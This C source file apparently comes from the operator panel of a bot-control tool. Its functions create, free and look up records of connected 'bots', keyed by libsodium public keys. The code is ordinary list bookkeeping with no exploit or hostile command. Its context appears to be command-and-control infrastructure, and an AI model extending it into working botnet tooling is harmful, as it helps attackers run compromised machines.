#include "lmem.h"
#include "lerror.h"
#include "pbot.h"

#include "panel.h"

tPanel_bot *panelB_newBot(uint8_t *pubKey) {
    tPanel_bot *bot = laikaM_malloc(sizeof(tPanel_bot));
    bot->name = laikaM_malloc(256);

    sodium_bin2hex(bot->name, 256, pubKey, crypto_kx_PUBLICKEYBYTES);

    /* copy pubKey to bot's pubKey */
    memcpy(bot->pub, pubKey, crypto_kx_PUBLICKEYBYTES);

    return bot;
}

void panelB_freeBot(tPanel_bot *bot) {
    laikaM_free(bot->name);
    laikaM_free(bot);
}

/* search connected bots by public key */
tPanel_bot *panelB_getBot(uint8_t *pubKey) {
    tPanel_listItem *curr = panel_botList->itemHead;
    tPanel_bot *bot; 

    while (curr != NULL) {
        bot = (tPanel_bot*)curr->uData;

        /* check pubKeys */
        if (memcmp(pubKey, bot->pub, crypto_kx_PUBLICKEYBYTES) == 0)
            return bot; /* they match! */

        curr = curr->next;
    }

    /* no match found :( */
    return NULL;
}

void panelB_setItem(tPanel_bot *bot, tPanel_listItem *item) {
    bot->item = item;
}